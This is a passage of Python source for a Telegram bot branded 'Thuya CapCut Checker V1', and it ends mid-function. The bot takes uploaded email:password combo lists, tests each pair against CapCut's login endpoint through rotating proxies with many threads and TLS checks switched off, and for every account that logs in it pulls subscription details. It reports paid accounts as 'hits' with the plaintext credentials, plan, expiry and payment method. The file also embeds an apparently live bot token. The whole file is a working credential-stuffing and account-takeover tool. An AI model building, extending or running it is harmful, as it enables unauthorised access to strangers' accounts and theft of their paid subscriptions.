import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import time
import logging
import threading
import re
import os
import io
import random
import traceback
import tempfile
import ssl as _ssl
import urllib3
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
BOT_TOKEN = "8636106424:AAHmGN9NqP1JfoppH-QrfzLPc-PiVxQIEXw"
ADMIN_IDS = [8770379893]
MAX_THREADS = 50
BATCH_SIZE = 10000
PROGRESS_INTERVAL = 500
REQUEST_TIMEOUT = 20
MAX_RETRIES = 3
RETRY_DELAY = 2
# ===================================

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None, threaded=True, num_threads=10)

# ========== PER-USER STATE ==========
user_sessions = {}
sessions_lock = threading.Lock()
hits_lock = threading.Lock()
stats_lock = threading.Lock()

hits_per_page = 10

# Shared hit lists
all_pro_hits = []
all_standard_hits = []
all_team_hits = []
all_free_accounts = []
all_error_accounts = []


def get_display_user(message_or_user):
    user = getattr(message_or_user, "from_user", message_or_user)
    uid = getattr(user, "id", None)
    username = getattr(user, "username", None)
    name = getattr(user, "first_name", None) or getattr(user, "last_name", None) or "User"
    if username:
        return f"@{username} | ID: {uid}"
    return f"{name} | ID: {uid}"


def send_text_document(chat_id, text, filename, caption=None):
    safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", filename) or "result.txt"
    temp_dir = tempfile.mkdtemp(prefix="tgdoc_")
    temp_path = os.path.join(temp_dir, safe_name)
    try:
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(text)
        with open(temp_path, "rb") as doc:
            bot.send_document(chat_id, doc, caption=caption)
    finally:
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
            os.rmdir(temp_dir)
        except Exception:
            pass

# Aggregate counters
pro_count = 0
standard_count = 0
team_count = 0
free_count = 0
fail_count = 0


def get_session(chat_id):
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {
                "checking_active": False,
                "stop_flag": False,
                "current_executor": None,
                "current_futures": None,
                "lock": threading.Lock(),
            }
        return user_sessions[chat_id]


# ========== USER WHITELIST ==========
USERS_FILE = "users.json"
allowed_users = set()
user_lock = threading.Lock()

def load_users():
    global allowed_users
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                data = json.load(f)
                allowed_users = set(int(x) for x in data.get("users", []))
                logging.info(f"📂 Loaded {len(allowed_users)} authorized users")
    except Exception as e:
        logging.error(f"User load err: {e}")
        allowed_users = set()

def save_users():
    try:
        with user_lock:
            with open(USERS_FILE, "w") as f:
                json.dump({"users": list(allowed_users)}, f)
    except Exception as e:
        logging.error(f"User save err: {e}")

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_authorized(user_id):
    return user_id in ADMIN_IDS or user_id in allowed_users

pending_admin_action = {}

# ========== PROXY MANAGEMENT ==========
PROXY_FILE = "proxies.json"
proxy_list = []
active_proxy_type = "HTTP"
proxy_lock = threading.Lock()
pending_proxy_action = {}

PROXY_TYPES = ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"]

def load_proxies():
    global proxy_list
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                proxy_list = json.load(f)
    except Exception:
        proxy_list = []

def save_proxies():
    try:
        with open(PROXY_FILE, "w") as f:
            json.dump(proxy_list, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save proxies: {e}")

def get_proxy_url(proxy_entry):
    ptype = proxy_entry.get("type", "HTTP").upper()
    raw = proxy_entry.get("proxy", "")
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, passwd = parts
        if ptype in ("SOCKS4", "SOCKS5"):
            scheme = "socks4a" if ptype == "SOCKS4" else "socks5h"
            return f"{scheme}://{user}:{passwd}@{host}:{port}"
        else:
            scheme = "https" if ptype == "HTTPS" else "http"
            return f"{scheme}://{user}:{passwd}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        if ptype in ("SOCKS4", "SOCKS5"):
            scheme = "socks4a" if ptype == "SOCKS4" else "socks5h"
            return f"{scheme}://{host}:{port}"
        else:
            scheme = "https" if ptype == "HTTPS" else "http"
            return f"{scheme}://{host}:{port}"
    return None

def get_random_proxy():
    with proxy_lock:
        if not proxy_list:
            return None
        entry = random.choice(proxy_list)
        return get_proxy_url(entry), entry.get("type", "HTTP")

# ========== PROXY LIVE TESTER ==========
PROXY_TEST_URL = "https://api.ipify.org?format=json"

def test_one_proxy(entry, timeout=12):
    proxy_url = get_proxy_url(entry)
    if not proxy_url:
        return {"ok": False, "ip": "", "latency": 0, "error": "bad format"}
    proxies = {"http": proxy_url, "https": proxy_url}
    t0 = time.time()
    try:
        r = requests.get(PROXY_TEST_URL, proxies=proxies, timeout=timeout)
        latency = int((time.time() - t0) * 1000)
        if r.status_code == 200:
            try:
                ip = r.json().get("ip", "?")
            except Exception:
                ip = r.text.strip()[:40]
            return {"ok": True, "ip": ip, "latency": latency, "error": ""}
        return {"ok": False, "ip": "", "latency": latency, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        latency = int((time.time() - t0) * 1000)
        return {"ok": False, "ip": "", "latency": latency, "error": str(e)[:60]}


class _TLSAdapter(HTTPAdapter):
    def _make_ssl_context(self):
        try:
            from urllib3.util.ssl_ import create_urllib3_context
            ctx = create_urllib3_context()
            ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            return ctx
        except Exception:
            return None

    def init_poolmanager(self, *args, **kwargs):
        ctx = self._make_ssl_context()
        if ctx:
            kwargs["ssl_context"] = ctx
        super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, proxy, **proxy_kwargs):
        ctx = self._make_ssl_context()
        if ctx:
            proxy_kwargs["ssl_context"] = ctx
        return super().proxy_manager_for(proxy, **proxy_kwargs)

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = _TLSAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.verify = False
    session._proxy_label = None
    proxy_info = get_random_proxy()
    if proxy_info:
        proxy_url, ptype = proxy_info
        session.proxies = {"http": proxy_url, "https": proxy_url}
        try:
            after_scheme = proxy_url.split("://", 1)[1]
            host_port = after_scheme.split("@")[-1]
            session._proxy_label = f"{ptype} ∙ {host_port}"
        except Exception:
            session._proxy_label = ptype
    return session


# ========== CAPCUT PLAN DETECTION ==========
def classify_capcut_plan(sub_data):
    """
    Classify CapCut subscription into: PRO, STANDARD, TEAM, FREE
    Based on subscription info from commerce API.
    """
    if not sub_data:
        return "FREE", {}

    subs = sub_data.get("data", {}).get("subscription_info", [])
    if not subs:
        # Try alternate response format
        if isinstance(sub_data.get("data"), list):
            subs = sub_data["data"]
        else:
            return "FREE", {}

    best_plan = "FREE"
    best_info = {}

    for sub in subs:
        is_vip = sub.get("is_vip", False)
        if not is_vip:
            continue

        vip_type = str(sub.get("vip_type", "")).lower()
        product_name = str(sub.get("product_name", "")).lower()
        scene = str(sub.get("scene", "")).lower()
        level = str(sub.get("vip_level", "")).lower()

        vip_end = sub.get("vip_end_time", 0)
        auto_renew = sub.get("is_auto_renew", False)
        pay_way = sub.get("pay_way", "?")

        # Convert vip_end_time
        expiry_str = "?"
        days_left = 0
        if vip_end and isinstance(vip_end, (int, float)):
            ts = vip_end
            if ts > 1e12:
                ts = ts / 1000
            try:
                exp_dt = datetime.fromtimestamp(ts, tz=timezone.utc)
                expiry_str = exp_dt.strftime("%Y-%m-%d")
                days_left = (exp_dt - datetime.now(tz=timezone.utc)).days
            except Exception:
                pass

        info = {
            "expiry": expiry_str,
            "days_left": days_left,
            "auto_renew": auto_renew,
            "pay_way": pay_way,
            "product_name": sub.get("product_name", "?"),
            "vip_type": sub.get("vip_type", "?"),
            "scene": sub.get("scene", "?"),
        }

        # Classify
        if any(k in product_name for k in ["team", "business", "enterprise"]) or \
           any(k in scene for k in ["workspace", "team"]) or \
           any(k in vip_type for k in ["team", "business"]):
            if best_plan != "PRO":
                best_plan = "TEAM"
                best_info = info
        elif any(k in product_name for k in ["pro"]) or \
             any(k in level for k in ["pro"]) or \
             any(k in vip_type for k in ["pro"]):
            best_plan = "PRO"
            best_info = info
        else:
            # Default VIP = Standard
            if best_plan == "FREE":
                best_plan = "STANDARD"
                best_info = info

    return best_plan, best_info


def detect_capcut_payment(pay_way):
    """Detect payment method from pay_way field."""
    if not pay_way or pay_way == "?":
        return "❓ Unknown"
    pw = str(pay_way).lower()
    if "google" in pw or "play" in pw or "android" in pw:
        return "🟢 Google Play"
    if "apple" in pw or "ios" in pw or "itunes" in pw:
        return "🍎 Apple"
    if "stripe" in pw:
        return "💳 Stripe"
    if "paypal" in pw:
        return "💙 PayPal"
    if "credit" in pw or "card" in pw:
        return "💳 Credit Card"
    if "web" in pw:
        return "💳 Web"
    # Try numeric codes
    try:
        code = int(pay_way)
        pay_map = {
            1: "🟢 Google Play",
            2: "🍎 Apple",
            3: "💳 Stripe (Web)",
            4: "💙 PayPal",
        }
        return pay_map.get(code, f"💳 Code:{code}")
    except (ValueError, TypeError):
        pass
    return f"💳 {pay_way}"


# ========== FORMAT HIT MESSAGE ==========
def format_hit(email, password, full_name, plan_type, sub_info, proxy_label=None):
    if plan_type == "PRO":
        header = "💎  𝗖𝗔𝗣𝗖𝗨𝗧 𝗣𝗥𝗢"
        icon = "💎"
    elif plan_type == "TEAM":
        header = "👥  𝗖𝗔𝗣𝗖𝗨𝗧 𝗧𝗘𝗔𝗠"
        icon = "👥"
    else:
        header = "⭐  𝗖𝗔𝗣𝗖𝗨𝗧 𝗦𝗧𝗔𝗡𝗗𝗔𝗥𝗗"
        icon = "⭐"

    expiry = sub_info.get("expiry", "?")
    days_left = sub_info.get("days_left", 0)
    auto_renew = "✅" if sub_info.get("auto_renew") else "❌"
    payment = detect_capcut_payment(sub_info.get("pay_way", "?"))
    product = sub_info.get("product_name", "?")
    vip_type = sub_info.get("vip_type", "?")

    # Days left color
    if days_left > 30:
        days_icon = "🟢"
    elif days_left > 7:
        days_icon = "🟡"
    elif days_left > 0:
        days_icon = "🟠"
    else:
        days_icon = "🔴"

    proxy_line = ""
    if proxy_label:
        proxy_line = f"\n🌐 Proxy    ➜  {proxy_label}"

    msg = (
        f"{header}\n"
        f"╔════════════════════════════╗\n"
        f"║📧 `{email}:{password}`\n"
        f"║👤 Name     ➜  {full_name}\n"
        f"║🏷 Plan     ➜  {icon} {plan_type}\n"
        f"║📦 Product  ➜  {product}\n"
        f"║📅 Expiry   ➜  {expiry}  ({days_left}d) {days_icon}\n"
        f"║🔄 Renew    ➜  {auto_renew}\n"
        f"║💳 Payment  ➜  {payment}\n"
        f"║🔑 VIP Type ➜  {vip_type}"
        f"{proxy_line}\n"
        f"╚════════════════════════════╝\n"
        f"\n"
        f"✂️ 𝗧𝗵𝘂𝘆𝗮 𝗖𝗮𝗽𝗖𝘂𝘁 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗩𝟭"
    )
    return msg


def build_hit_keyboard(email, password, plan_type):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🌐 Open CapCut", url="https://www.capcut.com/"),
        InlineKeyboardButton("📧 Gmail Login", url="https://mail.google.com/"),
    )
    return kb


# ========== CHECK SINGLE ACCOUNT ==========
def check_single_account(email, password):
    session = create_session()
    proxy_label = getattr(session, "_proxy_label", None)

    for attempt in range(MAX_RETRIES):
        try:
            # Step 1: Login
            login_url = (
                "https://www.capcut.com/passport/web/email/login/"
                "?aid=348188&account_sdk_source=web"
                "&passport_jssdk_version=1.0.7-beta.2&language=en"
                "&verifyFp=verify_mbf3u5tl_oZllcT6P_XZ9g_4WNW_A2UT_Sibk0A4qyiRE"
            )
            login_payload = f"mix_mode=1&email={email}&password={password}&fixed_mix_mode=1"

            login_headers = {
                "Host": "www.capcut.com",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "x-tt-passport-csrf-token": "d02afa0bff281ee9dcdc36aa3aa38d8f",
                "sec-ch-ua-mobile": "?0",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "sec-ch-ua-platform": '"Linux"',
                "Origin": "https://www.capcut.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.capcut.com/login?enter_from=log_out&current_page=work_space",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

            resp = session.post(login_url, data=login_payload, headers=login_headers, timeout=REQUEST_TIMEOUT)

            if resp.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue

            try:
                login_data = resp.json()
            except Exception:
                return email, password, "FAIL", "invalid json response", None

            msg_field = login_data.get("message", "")
            data_field = login_data.get("data", {}) or {}

            # Check failure
            if "doesn't match" in str(msg_field).lower() or \
               login_data.get("error_code") == 1009 or \
               msg_field == "error":
                return email, password, "FAIL", "wrong credentials", None

            # Check success
            app_id = data_field.get("app_id")
            user_id = data_field.get("user_id") or data_field.get("user_id_str")
            screen_name = data_field.get("screen_name", "?")

            if not app_id and not user_id:
                # Try alternate paths
                if "success" not in str(msg_field).lower():
                    return email, password, "FAIL", f"no app_id: {str(msg_field)[:40]}", None

            if not app_id:
                app_id = data_field.get("user_id", 0)

            # Step 2: Check subscription
            sub_url = "https://commerce.us.capcut.com/commerce/v3/trade/subscription_infos"
            sub_payload = json.dumps({
                "scene": ["vip", "workspace"],
                "vip_levels": ["vip"],
                "app_id": app_id
            })

            sub_headers = {
                "Host": "commerce-api-sg.capcut.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sign-ver": "1",
                "sign": "2832a2ea2f27fad70d2d050280945b91",
                "sec-ch-ua-platform": '"Linux"',
                "pf": "7",
                "tdid": "",
                "sec-ch-ua-mobile": "?0",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "loc": "CA",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "appvr": "12.4.0",
                "app-sdk-version": "48.0.0",
                "appid": str(app_id),
                "lan": "en",
                "device-time": str(int(time.time())),
                "Origin": "https://www.capcut.com",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.capcut.com/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

            resp2 = session.post(sub_url, data=sub_payload, headers=sub_headers, timeout=REQUEST_TIMEOUT)

            if resp2.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue

            try:
                sub_data = resp2.json()
            except Exception:
                sub_data = {}

            plan_type, sub_info = classify_capcut_plan(sub_data)

            if plan_type == "FREE":
                return email, password, "FREE", f"{screen_name}", None

            # It's a hit!
            result_msg = format_hit(email, password, screen_name, plan_type, sub_info, proxy_label)
            return email, password, "HIT", result_msg, plan_type

        except requests.exceptions.ConnectionError:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "connection error", None
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "timeout", None
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", str(e)[:40], None
        except Exception as e:
            logging.error(f"Error {email}: {e}")
            return email, password, "FAIL", str(e)[:40], None
        finally:
            session.close()

    return email, password, "FAIL", "max retries", None


# ========== MENU ==========
def send_main_menu(chat_id, user_id=None, user_label=None):
    with hits_lock:
        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))
    sess = get_session(chat_id)
    status = "🔴 CHECKING" if sess["checking_active"] else "🟢 IDLE"

    msg = f"""{'━' * 32}
✂️ 𝗧𝗵𝘂𝘆𝗮 𝗖𝗮𝗽𝗖𝘂𝘁 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗩𝟭
{'━' * 32}
👑 {user_label or f"ID: {user_id or chat_id}"} ∙ {status}
🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
👥 Active checkers: {active_count}

💎 Pro: {pro_count} ∙ ⭐ Standard: {standard_count} ∙ 👥 Team: {team_count}
💾 Saved: {total_hits}"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 START", callback_data="start_check"),
        InlineKeyboardButton("📊 STATS", callback_data="my_stats")
    )
    markup.row(
        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
    )
    if user_id is not None and is_admin(user_id):
        markup.row(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
    markup.row(InlineKeyboardButton("❌ CLOSE", callback_data="close_panel"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_admin_panel(chat_id):
    total_users = len(allowed_users)
    msg = f"""{'━' * 32}
👑 𝗔𝗗𝗠𝗜𝗡  𝗣𝗔𝗡𝗘𝗟
{'━' * 32}
👥 Authorized users: *{total_users}*
🛡 Admins: *{len(ADMIN_IDS)}*

Manage who can access the bot."""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("➕ ADD USER", callback_data="admin_add"),
        InlineKeyboardButton("➖ REMOVE USER", callback_data="admin_remove"),
    )
    markup.row(InlineKeyboardButton("📋 LIST USERS", callback_data="admin_list"))
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_user_list(chat_id):
    if not allowed_users:
        text = "📭 No authorized users yet.\n\nUse ➕ ADD USER and send a numeric Telegram ID."
    else:
        lines = [f"`{uid}`" for uid in sorted(allowed_users)]
        text = f"👥 *Authorized Users ({len(allowed_users)})*\n\n" + "\n".join(lines)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)


def send_stats(chat_id):
    with hits_lock:
        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
    total = pro_count + standard_count + team_count + free_count + fail_count
    rate = round(total_hits / total * 100, 2) if total > 0 else 0
    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))

    msg = f"""{'━' * 32}
📊 𝗦𝗧𝗔𝗧𝗦
{'━' * 32}
💎 Pro: {pro_count:,} ∙ ⭐ Standard: {standard_count:,}
👥 Team: {team_count:,}
⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
👥 Active checkers: {active_count}"""

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_hits_list(chat_id, page=0):
    with hits_lock:
        total_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits)
    if total_hits == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
        bot.send_message(chat_id, "📭 No hits yet. Send a combo file!", reply_markup=markup)
        return

    all_hits = []
    for e, p, r in all_pro_hits:
        all_hits.append(("💎", e, p, r))
    for e, p, r in all_standard_hits:
        all_hits.append(("⭐", e, p, r))
    for e, p, r in all_team_hits:
        all_hits.append(("👥", e, p, r))

    total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
    page = max(0, min(page, total_pages - 1))
    start = page * hits_per_page
    end = min(start + hits_per_page, len(all_hits))

    text = f"💾 𝗛𝗜𝗧𝗦 ({page+1}/{total_pages})\n"
    for i, (icon, e, p, r) in enumerate(all_hits[start:end], start=start+1):
        text += f"\n{icon} [{i}] `{e[:25]}..`\n"

    text += "\n💡 EXPORT for full details"

    markup = InlineKeyboardMarkup(row_width=3)
    btns = []
    if page > 0:
        btns.append(InlineKeyboardButton("◀️", callback_data=f"hits_page_{page-1}"))
    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        btns.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
    markup.row(*btns)
    markup.row(
        InlineKeyboardButton("📋 EXPORT HITS", callback_data="copy_all_hits"),
        InlineKeyboardButton("⚠️ FREE", callback_data="export_free"),
        InlineKeyboardButton("❌ ERRORS", callback_data="export_errors")
    )
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)


# ========== PROXY MENU ==========
def send_proxy_menu(chat_id, message_id=None):
    with proxy_lock:
        total = len(proxy_list)
        types_count = {}
        for p in proxy_list:
            t = p.get("type", "HTTP")
            types_count[t] = types_count.get(t, 0) + 1
    type_info = " ∙ ".join(f"{t}:{c}" for t, c in types_count.items()) if types_count else "None"

    msg = f"""{'━' * 32}
🌐 𝗣𝗥𝗢𝗫𝗬  𝗠𝗔𝗡𝗔𝗚𝗘𝗥
{'━' * 32}
📊 Total Proxies: *{total}*
📋 Types: {type_info}

Manage your proxy list below."""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("➕ ADD", callback_data="proxy_add"),
        InlineKeyboardButton("➖ REMOVE", callback_data="proxy_remove")
    )
    markup.row(
        InlineKeyboardButton("📋 LIST", callback_data="proxy_list"),
        InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="proxy_clear")
    )
    markup.row(InlineKeyboardButton("🧪 TEST LIVE", callback_data="proxy_test"))
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_proxy_type_selector(chat_id, message_id=None):
    msg = "🌐 *Select Proxy Type*\n\nChoose the type for your proxy:"
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("🔵 HTTP", callback_data="proxy_type_HTTP"),
        InlineKeyboardButton("🟢 HTTPS", callback_data="proxy_type_HTTPS")
    )
    markup.row(
        InlineKeyboardButton("🟠 SOCKS4", callback_data="proxy_type_SOCKS4"),
        InlineKeyboardButton("🔴 SOCKS5", callback_data="proxy_type_SOCKS5")
    )
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_proxy_list(chat_id, page=0, message_id=None):
    with proxy_lock:
        total = len(proxy_list)
    if total == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
        if message_id:
            try:
                bot.edit_message_text("📭 No proxies added yet.", chat_id, message_id, reply_markup=markup)
                return
            except Exception:
                pass
        bot.send_message(chat_id, "📭 No proxies added yet.", reply_markup=markup)
        return

    per_page = 10
    total_pages = (total + per_page - 1) // per_page
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = min(start + per_page, total)

    text = f"🌐 *PROXIES* ({page+1}/{total_pages})\n\n"
    with proxy_lock:
        for i, p in enumerate(proxy_list[start:end], start=start+1):
            ptype = p.get("type", "HTTP")
            raw = p.get("proxy", "?")
            parts = raw.split(":")
            display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
            icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
            text += f"{icon} `[{i}]` {ptype} ∙ `{display}`\n"

    markup = InlineKeyboardMarkup(row_width=3)
    btns = []
    if page > 0:
        btns.append(InlineKeyboardButton("◀️", callback_data=f"proxy_pg_{page-1}"))
    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        btns.append(InlineKeyboardButton("▶️", callback_data=f"proxy_pg_{page+1}"))
    if btns:
        markup.row(*btns)
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)


# ========== CALLBACK HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global MAX_THREADS, MAX_RETRIES
    global pro_count, standard_count, team_count, free_count, fail_count

    try:
        if call.data == "start_check":
            bot.answer_callback_query(call.id)
            sess = get_session(call.message.chat.id)
            if sess["checking_active"]:
                bot.send_message(call.message.chat.id, "⚠️ You already have a check running! /stop first")
                return
            bot.send_message(call.message.chat.id,
                "📎 Send combo file (.txt)\nFormat: `email:password`", parse_mode='Markdown')

        elif call.data == "my_stats":
            bot.answer_callback_query(call.id)
            send_stats(call.message.chat.id)

        elif call.data == "view_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "tools":
            bot.answer_callback_query(call.id)
            with proxy_lock:
                proxy_count = len(proxy_list)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🧵 THREADS", callback_data="thread_settings"),
                InlineKeyboardButton("🔄 RETRIES", callback_data="retry_settings")
            )
            markup.row(InlineKeyboardButton(f"🌐 PROXIES ({proxy_count})", callback_data="proxy_menu"))
            markup.row(InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits"))
            markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
            bot.send_message(call.message.chat.id,
                f"⚙️ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x ∙ ⏱{REQUEST_TIMEOUT}s ∙ 🌐{proxy_count} proxies",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "thread_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=4)
            markup.row(
                InlineKeyboardButton("10", callback_data="set_threads_10"),
                InlineKeyboardButton("20", callback_data="set_threads_20"),
                InlineKeyboardButton("30", callback_data="set_threads_30"),
                InlineKeyboardButton("50", callback_data="set_threads_50")
            )
            markup.row(
                InlineKeyboardButton("70", callback_data="set_threads_70"),
                InlineKeyboardButton("80", callback_data="set_threads_80"),
                InlineKeyboardButton("100", callback_data="set_threads_100")
            )
            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}`", parse_mode='Markdown', reply_markup=markup)

        elif call.data == "retry_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=3)
            markup.row(
                InlineKeyboardButton("1x", callback_data="set_retry_1"),
                InlineKeyboardButton("3x", callback_data="set_retry_3"),
                InlineKeyboardButton("5x", callback_data="set_retry_5")
            )
            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x`", parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("set_threads_"):
            MAX_THREADS = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data.startswith("set_retry_"):
            MAX_RETRIES = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Retries → {MAX_RETRIES}x")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "clear_hits":
            bot.answer_callback_query(call.id)
            with hits_lock:
                all_pro_hits.clear()
                all_standard_hits.clear()
                all_team_hits.clear()
                all_free_accounts.clear()
                all_error_accounts.clear()
            with stats_lock:
                pro_count = standard_count = team_count = free_count = fail_count = 0
            bot.send_message(call.message.chat.id, "✅ Cleared!")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "main_menu":
            bot.answer_callback_query(call.id)
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "close_panel":
            bot.answer_callback_query(call.id)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass

        elif call.data == "noop":
            bot.answer_callback_query(call.id)

        elif call.data == "copy_all_hits":
            bot.answer_callback_query(call.id)
            with hits_lock:
                has_hits = len(all_pro_hits) + len(all_standard_hits) + len(all_team_hits) > 0
            if not has_hits:
                bot.send_message(call.message.chat.id, "📭 No hits.")
            else:
